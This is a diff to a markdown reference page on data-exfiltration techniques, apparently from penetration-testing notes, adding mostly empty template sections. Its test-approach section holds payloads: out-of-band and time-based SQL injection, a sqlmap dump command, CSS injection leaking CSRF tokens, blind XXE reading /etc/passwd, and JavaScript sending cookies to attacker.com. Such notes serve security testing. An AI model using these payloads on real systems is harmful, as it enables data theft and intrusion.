@@ -1,4 +1,62 @@
-# Data Exfiltration Techniques
+# Data Exfil Techniques
+
+> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.
+
+_Last updated: — · Items: 0_
+
+---
+
+## What
+
+_Define the class, prerequisites, and typical finding shape. Fill with real content._
+_pending enrichment — baseline opener below_
+
+See items under ## Items for per-finding details.
+
+---
+
+## CVEs
+
+_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._
+
+---
+
+## Probes
+
+_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
+_pending enrichment_
+
+---
+
+## PoCs
+
+_Public PoC links rolled up from items below._
+
+_No PoCs in items yet._
+
+---
+
+## Reproduction
+
+_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
+_pending enrichment_
+
+---
+
+## Defense
+
+_Patch guidance and detection rules. Populated from vendor advisories._
+_pending enrichment_
+
+---
+
+## References
+
+_Populated by daily refresh-latest pipeline._
+
+---
+
+## Items
 
 > Data exfiltration — techniques for extracting sensitive data from a target system through covert or out-of-band channels when direct output is unavailable.
 
@@ -15,6 +73,7 @@
 ## Test Approach
 
 1. **OOB via Interactsh** — set up callback, trigger with DNS/HTTP lookup:
+
    ```
    # SQLi OOB
    ' AND LOAD_FILE(CONCAT('//',({SELECT password FROM users LIMIT 1}),'.attacker.interactsh.com/x'))-- -
@@ -25,6 +84,7 @@
    ```
 
 2. **DNS exfil for long strings** — encode data as DNS subdomain labels (63 char max each):
+
    ```
    # Encode each chunk as hex subdomain
    SELECT SUBSTRING(password,1,30) INTO OUTFILE '/dev/null'
@@ -32,19 +92,24 @@
    ```
 
 3. **CSS injection char-by-char** — leak CSRF tokens via `style` attribute injection + background-image probe:
+
    ```css
    input[name="csrf"][value^="a"] { background: url(https://attacker.com/?c=a); }
    input[name="csrf"][value^="b"] { background: url(https://attacker.com/?c=b); }
    ```
+
    Inject via: `style="color:red; --x:url(attacker.com/?leak=` and close with `)"` for attribute-only injection.
 
 4. **Time-based blind SQLi** — when all OOB is blocked:
+
    ```
    ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)-- -
    ```
+
    Use sqlmap for automation: `sqlmap -u "https://target.com/?id=1" --technique=T --dump`
 
 5. **Blind XXE via error** — force DTD parse error containing file content:
+
    ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
@@ -52,6 +117,7 @@
    ```
 
 6. **HTTP exfil via redirect** — if SSRF/CSRF can make GET requests, append data to URL:
+
    ```
    fetch('https://attacker.com/?'+document.cookie)
    new Image().src='https://attacker.com/?x='+btoa(document.body.innerHTML)
